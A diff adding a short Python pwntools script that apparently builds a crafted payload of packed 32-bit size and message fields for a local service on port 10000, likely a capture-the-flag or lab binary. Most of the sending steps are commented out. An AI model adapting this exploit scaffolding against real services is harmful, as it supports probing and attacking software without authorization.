@@ -1,0 +1,27 @@
+#!/usr/bin/python3
+from pwn import *
+lmao = {}
+lmao["received_of_receive"] = p32(0x100)
+lmao["received"] = p32(0x100)
+lmao["received2"] = p32(0)
+#####################
+lmao["size"] =  p32(0)
+lmao["msg"] = p32(0x100)
+p = remote("0",10000)
+payload = b""
+for item in lmao:
+    payload += lmao[item]
+print(f"debug: {payload}")
+# p.send(payload)
+# input("send 1 ->")
+# p.send(lmao["received_of_receive"])
+# input("send 2 ->")
+# p.send(lmao["received"])
+# input("send 3 ->")
+# p.send(lmao["received2"])
+# input("send 4 ->")
+# p.send(lmao["size"])
+# input("send 5 ->")
+# p.send(lmao["msg"])
+# p.interactive()
+
